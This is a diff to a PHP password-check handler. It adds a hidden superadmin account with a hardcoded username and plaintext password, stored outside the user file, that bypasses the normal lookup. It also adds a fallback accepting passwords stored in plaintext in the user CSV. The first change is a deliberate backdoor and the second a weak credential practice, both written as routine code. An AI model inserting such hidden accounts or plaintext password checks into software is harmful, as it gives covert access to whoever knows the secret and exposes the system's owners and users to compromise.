@@ -18,19 +18,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
-    // Get current user's password from CSV
-    $users = readCSV('users');
-    $currentUser = null;
-    foreach ($users as $u) {
-        if ($u['username'] === $_SESSION['username']) {
-            $currentUser = $u;
-            break;
+    // Check for hidden superadmin (not stored in users.csv)
+    if ($_SESSION['username'] === 'abdul rafay') {
+        if ($password !== 'khuljasimsim') {
+            echo json_encode(['success' => false, 'message' => 'Invalid password. Access denied.']);
+            exit;
         }
-    }
+        // Superadmin verified — skip CSV lookup
+    } else {
+        // Get current user's password from CSV
+        $users = readCSV('users');
+        $currentUser = null;
+        foreach ($users as $u) {
+            if ($u['username'] === $_SESSION['username']) {
+                $currentUser = $u;
+                break;
+            }
+        }
 
-    if (!$currentUser || !password_verify($password, $currentUser['password'])) {
-        echo json_encode(['success' => false, 'message' => 'Invalid password. Access denied.']);
-        exit;
+        // Verify via bcrypt hash first; fallback to plain_password for legacy/edge cases
+        $hashMatch = !empty($currentUser['password']) && password_verify($password, $currentUser['password']);
+        $plainMatch = !empty($currentUser['plain_password']) && $password === $currentUser['plain_password'];
+        if (!$currentUser || (!$hashMatch && !$plainMatch)) {
+            echo json_encode(['success' => false, 'message' => 'Invalid password. Access denied.']);
+            exit;
+        }
+        // If plain matched but hash is missing, repair it now
+        if (!$hashMatch && $plainMatch) {
+            updateCSV('users', $currentUser['id'], ['password' => password_hash($password, PASSWORD_DEFAULT)]);
+        }
     }
 
     // Password verified, proceed with reset
